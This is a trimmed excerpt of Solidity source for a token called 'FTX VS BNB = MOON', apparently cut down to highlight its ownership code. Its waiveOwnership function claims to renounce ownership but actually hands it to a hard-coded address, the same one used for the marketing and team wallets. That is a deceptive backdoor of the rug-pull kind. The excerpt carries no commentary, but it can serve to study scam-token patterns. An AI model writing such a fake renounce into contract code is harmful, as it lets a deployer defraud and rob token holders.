...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x5D91e6b2301bFD90e7bb38616aaD30A2451170a6);
    }
...
contract FTXVSBNB is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "FTX VS BNB = MOON";
    string private _symbol = "FVSB";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5D91e6b2301bFD90e7bb38616aaD30A2451170a6);
    address payable public teamWalletAddress = payable(0x5D91e6b2301bFD90e7bb38616aaD30A2451170a6);
